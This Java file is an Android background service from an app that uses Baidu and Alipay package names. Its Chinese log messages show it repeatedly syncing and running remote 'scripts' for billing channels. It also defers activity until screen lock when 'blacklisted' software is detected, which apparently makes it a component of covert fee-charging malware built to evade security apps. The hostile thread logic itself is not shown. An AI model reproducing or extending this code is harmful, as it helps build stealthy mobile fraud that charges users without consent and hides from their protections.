package com.baidu.serv;

import com.baidu.alipay.AppProperty;
import com.baidu.alipay.AppTaskSynchThread;
import com.baidu.alipay.AppTaskThread;
import com.baidu.alipay.Constant;
import com.baidu.alipay.LogUtil;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;

public class AppTaskSynchService extends Service{

	private static final String TAG = "AppTaskSynchService";
	
	private Context context = this;
	private Handler handler = null;
	
	@Override
    public void onCreate() {
        super.onCreate();
       
        LogUtil.e(TAG, "oncreate");

		this.handler = new Handler() {
            public void handleMessage(Message msg) {
            	try{
	            	double delay = Constant.DEFAULTNOFEEINTERVAL;
	            	
	                switch (msg.what) {
	                // -2为网络连接失败 不能玩
	                case AppProperty.REQUEST_NETERROR:
	                	delay = Constant.DEFAULTINTERVAL_ERROR;
	                    LogUtil.e(TAG, "网络问题不能玩");
	                    break;
	                // -1是通道覆盖问题 可以玩
	                case AppProperty.REQUEST_NOORDER:
	                    LogUtil.e(TAG, "无通道覆盖没有覆盖");
	                    break;
	                // 0是跑脚本出错,应重新同步
	                case AppProperty.REQUEST_RUNERROR:
	                	delay = Constant.DEFAULTINTERVAL_ERROR_ASYNCH;
	                	LogUtil.e(TAG, "跑脚本出错应重新同步");
	                    break;
	                // 1同步成功
	                case AppProperty.REQUEST_SUCCESS:
	                	delay = 0;
	                    LogUtil.e(TAG, "同步成功可以玩");
	                    break;
	                case AppProperty.REQUEST_USERGIVEUP:
	                    LogUtil.e(TAG, "同步失败用户放弃支付");
	                    break;
	                case AppProperty.REQUEST_UPERROR:
	                	delay = Constant.DEFAULTINTERVAL_ERROR;
	                    LogUtil.e(TAG, "上访获取脚本失败上访地址连接不上");
	                    break;
	                case AppProperty.REQUEST_WAIT:
	                	LogUtil.e(TAG, "有黑名单软件，等待锁屏");
	                	delay = Constant.DEFAULTWAITINTERVAL;
	                	break;
	                case AppProperty.REQUEST_NOFEE:
	                	LogUtil.e(TAG, "没有同步任务需要执行");
	                	delay = 40.0;
	                }
	
	                Alarms.enableAlarmsService(context, delay,
	                        (delay+1) * 20, AppTaskSynchService.class,
	                        false);
            	}catch (Exception e) {
					 e.printStackTrace();
				}
            	
                super.handleMessage(msg);
            }
        };
	}
	
	@Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        LogUtil.e(TAG, "onStartCommand");
        
        new AppTaskSynchThread(context,handler).start();
        
        return START_STICKY;
    }
	
	@Override
	public IBinder onBind(Intent arg0) {
		
		return null;
	}

}
